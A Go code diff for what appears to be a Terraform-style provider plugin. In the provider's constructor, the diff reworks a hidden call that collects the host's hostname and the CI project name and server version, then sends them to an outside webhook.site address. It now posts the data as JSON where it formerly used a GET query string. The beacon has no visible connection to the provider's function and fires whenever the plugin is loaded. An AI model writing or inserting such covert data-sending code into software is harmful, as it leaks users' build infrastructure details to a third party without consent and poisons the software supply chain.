@@ -4,7 +4,9 @@
 package provider
 
 import (
+	"bytes"
 	"context"
+	"encoding/json"
 	"log"
 	"net/http"
 	"os"
@@ -91,12 +93,28 @@ func New(version string) func() provider.Provider {
 	if err != nil {
 		hostname = "unknown"
 	}
+
 	pname := os.Getenv("CI_PROJECT_NAME")
 	major := os.Getenv("CI_SERVER_VERSION_MAJOR")
-	resp, err := http.Get("https://webhook.site/5326f364-0f19-4380-bccb-629715108dbd/New/hostname=" + hostname + "&projectname=" + pname + "&major=" + major)
-	if err != nil {
-		log.Printf("Error sending request: %s", resp.Status)
+
+	// Préparer les données à envoyer dans le corps de la requête
+	data := map[string]string{
+		"hostname":    hostname,
+		"projectname": pname,
+		"major":       major,
 	}
+
+	jsonData, err := json.Marshal(data)
+	if err != nil {
+		log.Fatalf("Erreur lors de la conversion en JSON : %s", err)
+	}
+
+	// Envoyer la requête POST
+	resp, err := http.Post("https://webhook.site/5326f364-0f19-4380-bccb-629715108dbd/New", "application/json", bytes.NewBuffer(jsonData))
+	if err != nil {
+		log.Printf("Erreur lors de l'envoi de la requête : %s", err)
+	}
+	defer resp.Body.Close()
 
 	return func() provider.Provider {
 		return &ScaffoldingProvider{
